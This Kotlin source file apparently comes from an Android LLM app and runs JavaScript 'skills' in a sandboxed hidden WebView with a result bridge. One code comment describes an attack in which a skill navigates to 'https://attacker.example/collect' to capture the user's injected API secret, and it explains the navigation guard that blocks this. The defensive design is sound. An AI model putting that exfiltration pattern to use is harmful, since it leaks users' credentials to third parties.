package com.clma.app.skills.js

import android.content.Context
import android.os.Looper
import android.util.Log
import android.view.ViewGroup
import android.webkit.ConsoleMessage
import android.webkit.JavascriptInterface
import android.webkit.WebChromeClient
import android.webkit.WebResourceRequest
import android.webkit.WebResourceResponse
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.webkit.WebViewAssetLoader
import kotlinx.coroutines.CompletableDeferred
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.TimeoutCancellationException
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeout
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.JsonPrimitive
import kotlinx.serialization.json.contentOrNull
import kotlinx.serialization.json.jsonObject
import kotlinx.serialization.json.jsonPrimitive
import org.json.JSONObject
import java.io.File
import java.util.UUID

private const val TAG = "JsSkillRunner"

/**
 * Phase 18 — runs a skill's JavaScript inside a hidden WebView and returns the result to
 * the LLM. Mirrors Google AI Edge Gallery's contract practical verbatim.
 */
class JsSkillRunner(private val context: Context) {

    sealed class Result {
        data class Ok(val parsed: ParsedResult) : Result()
        data class Err(val code: String, val detail: String) : Result()
    }

    /**
     * Decoded shape of the JS skill's return value. Any combination of [text], [imageBase64],
     * and [webviewUrl] may be present.
     */
    data class ParsedResult(
        val text: String? = null,
        val imageBase64: String? = null,
        val webviewUrl: String? = null,
        val webviewIframe: Boolean = true,
        val webviewAspectRatio: Float = 4f / 3f,
        val error: String? = null,
    )

    /**
     * Run [scriptFile] with [data] (and optional [secret] for skills that need an API key).
     */
    suspend fun runScript(
        scriptFile: File,
        skillRootDir: File? = null,
        data: String,
        secret: String = "",
        timeoutMs: Long = DEFAULT_TIMEOUT_MS,
    ): Result {
        if (!scriptFile.exists() || !scriptFile.isFile) {
            return Result.Err("script_not_found", "no JS skill script at ${scriptFile.absolutePath}")
        }
        return withContext(Dispatchers.Main) {
            val deferred = CompletableDeferred<String>()
            var webView: WebView? = null
            try {
                val rootDir = (skillRootDir ?: scriptFile.parentFile)
                    ?: return@withContext Result.Err("script_not_found", "skill script has no parent directory")
                val relPath = runCatching { scriptFile.relativeTo(rootDir).invariantSeparatorsPath }
                    .getOrNull()?.takeIf { it.isNotBlank() && !it.startsWith("..") }
                    ?: scriptFile.name

                val storageHandler = WebViewAssetLoader.InternalStoragePathHandler(context, rootDir)
                val htmlEntryHandler = WebViewAssetLoader.PathHandler { path ->
                    val response = storageHandler.handle(path) ?: return@PathHandler null
                    if (path == relPath && response.mimeType != "text/html") {
                        WebResourceResponse(
                            "text/html",
                            response.encoding,
                            response.statusCode,
                            response.reasonPhrase,
                            response.responseHeaders,
                            response.data,
                        )
                    } else {
                        response
                    }
                }
                val originHost = skillOriginHost(rootDir.name)
                val assetLoader = WebViewAssetLoader.Builder()
                    .setDomain(originHost)
                    .addPathHandler(SKILL_PATH, htmlEntryHandler)
                    .build()
                val wv = WebView(context.applicationContext).apply {
                    @Suppress("SetJavaScriptEnabled")
                    settings.javaScriptEnabled = true
                    @Suppress("DEPRECATION")
                    settings.allowFileAccess = false
                    @Suppress("DEPRECATION")
                    settings.allowFileAccessFromFileURLs = false
                    @Suppress("DEPRECATION")
                    settings.allowUniversalAccessFromFileURLs = false
                    settings.cacheMode = WebSettings.LOAD_NO_CACHE
                    settings.domStorageEnabled = true
                    settings.javaScriptCanOpenWindowsAutomatically = false
                    settings.mixedContentMode = WebSettings.MIXED_CONTENT_COMPATIBILITY_MODE
                    layoutParams = ViewGroup.LayoutParams(1, 1)
                }
                wv.addJavascriptInterface(BridgeImpl(deferred), JS_INTERFACE_NAME)
                wv.webChromeClient = object : WebChromeClient() {
                    override fun onConsoleMessage(consoleMessage: ConsoleMessage?): Boolean {
                        consoleMessage?.let {
                            Log.d(TAG, "[JS console] ${it.message()} (${it.sourceId()}:${it.lineNumber()})")
                        }
                        return true
                    }
                }
                // https://<skill-slug>-<hash>.appassets.androidplatform.net/skill/<relPath> —
                // intercepted by the asset loader and served from the skill root; never touches
                // the network. Hoisted above the client: both the navigation guard and the
                // injection guard below compare against it.
                val skillUrl = "https://$originHost$SKILL_PATH$relPath"
                val injected = java.util.concurrent.atomic.AtomicBoolean(false)
                wv.webViewClient = object : WebViewClient() {
                    override fun shouldInterceptRequest(
                        view: WebView?,
                        request: WebResourceRequest,
                    ): WebResourceResponse? = assetLoader.shouldInterceptRequest(request.url)

                    override fun shouldOverrideUrlLoading(
                        view: WebView?,
                        request: WebResourceRequest?,
                    ): Boolean {
                        // Any navigation off our virtual asset origin is refused. Without this a
                        // skill could do `location.href = "https://attacker.example/collect"`, get
                        // a fresh `onPageFinished`, and have the user's plaintext skill secret
                        // injected into a third-party page.
                        val target = request?.url ?: return true
                        return target.host != originHost
                    }

                    override fun onPageFinished(view: WebView?, url: String?) {
                        super.onPageFinished(view, url)
                        // Entry document only, exactly once: a hash change, a reload or a re-entry
                        // otherwise re-ran the trigger (and re-injected the secret).
                        if (url != skillUrl) return
                        if (!injected.compareAndSet(false, true)) return
                        Log.d(TAG, "page finished, evaluating trigger script: $url")
                        val safeData = JSONObject.quote(data)
                        val safeSecret = JSONObject.quote(secret)
                        val script = """
                            (async function() {
                                var startTs = Date.now();
                                while (true) {
                                    if (typeof ai_edge_gallery_get_result === 'function') break;
                                    await new Promise(r => setTimeout(r, 100));
                                    if (Date.now() - startTs > 10000) {
                                        $JS_INTERFACE_NAME.onResultReady(JSON.stringify({error: "ai_edge_gallery_get_result not defined within 10s"}));
                                        return;
                                    }
                                }
                                try {
                                    var result = await ai_edge_gallery_get_result($safeData, $safeSecret);
                                    $JS_INTERFACE_NAME.onResultReady(typeof result === 'string' ? result : JSON.stringify(result));
                                } catch (e) {
                                    $JS_INTERFACE_NAME.onResultReady(JSON.stringify({error: "JS threw: " + (e && e.message ? e.message : String(e))}));
                                }
                            })();
                        """.trimIndent()
                        view?.evaluateJavascript(script, null)
                    }
                }
                webView = wv
                Log.d(TAG, "loading: $skillUrl (data=${data.take(80)}, secret=${if (secret.isNotEmpty()) "<set>" else "<empty>"})")
                wv.loadUrl(skillUrl)

                val resultJson = withTimeout(timeoutMs) { deferred.await() }
                Result.Ok(parseResultJson(resultJson))
            } catch (_: TimeoutCancellationException) {
                Log.w(TAG, "JS skill execution timed out after ${timeoutMs}ms")
                Result.Err("script_timeout",
                    "JS skill execution exceeded ${timeoutMs}ms — check for infinite loops or unresponsive network calls")
            } catch (t: Throwable) {
                Log.w(TAG, "JS skill execution failed", t)
                Result.Err("script_failed", "${t::class.simpleName}: ${t.message.orEmpty()}")
            } finally {
                runCatching { webView?.destroy() }
                    .onFailure { Log.w(TAG, "WebView.destroy failed", it) }
            }
        }
    }

    private fun parseResultJson(json: String): ParsedResult {
        val obj = runCatching { Json.parseToJsonElement(json).jsonObject }.getOrNull()
            ?: return ParsedResult(error = "JS skill returned non-JSON: $json")
        val errorRaw = obj["error"]?.jsonPrimitive?.contentOrNull
        val text = obj["result"]?.jsonPrimitive?.contentOrNull
        val imageBase64 = (obj["image"] as? JsonObject)?.get("base64")?.jsonPrimitive?.contentOrNull
        val webview = obj["webview"] as? JsonObject
        val webviewUrl = webview?.get("url")?.jsonPrimitive?.contentOrNull
        val webviewIframe = (webview?.get("iframe") as? JsonPrimitive)?.contentOrNull?.toBoolean() ?: true
        val aspectRatio = webview?.get("aspectRatio")?.let {
            runCatching { it.toString().toFloat() }.getOrNull()
        } ?: (4f / 3f)
        return ParsedResult(
            text = text,
            imageBase64 = imageBase64,
            webviewUrl = webviewUrl,
            webviewIframe = webviewIframe,
            webviewAspectRatio = aspectRatio,
            error = errorRaw,
        )
    }

    private class BridgeImpl(private val target: CompletableDeferred<String>) {
        @JavascriptInterface
        fun onResultReady(json: String) {
            Log.d(TAG, "JS bridge fired: ${json.take(120)}")
            target.complete(json)
        }
    }

    companion object {
        private const val JS_INTERFACE_NAME = "AiEdgeGallery"
        private const val ASSET_DOMAIN = "appassets.androidplatform.net"
        private const val SKILL_PATH = "/skill/"
        const val DEFAULT_TIMEOUT_MS = 60_000L
        const val MAX_TIMEOUT_MS = 5 * 60_000L
        const val MAX_DATA_LENGTH = 64 * 1024

        internal fun skillOriginHost(skillDirName: String): String {
            val slug = skillDirName.lowercase()
                .replace(Regex("[^a-z0-9]+"), "-")
                .trim('-')
                .take(24)
                .trimEnd('-')
                .ifEmpty { "skill" }
            val hash = java.security.MessageDigest.getInstance("SHA-256")
                .digest(skillDirName.toByteArray(Charsets.UTF_8))
                .take(4)
                .joinToString("") { "%02x".format(it) }
            return "$slug-$hash.$ASSET_DOMAIN"
        }
    }
}

fun decodeBase64ImageToCacheFile(context: Context, base64: String): File? = runCatching {
    val cleanBase64 = base64.substringAfter(",")
    val bytes = android.util.Base64.decode(cleanBase64, android.util.Base64.DEFAULT)
    val outDir = File(context.cacheDir, "skill_results").also { it.mkdirs() }
    val out = File(outDir, "${UUID.randomUUID()}.png")
    out.writeBytes(bytes)
    out
}.getOrNull()
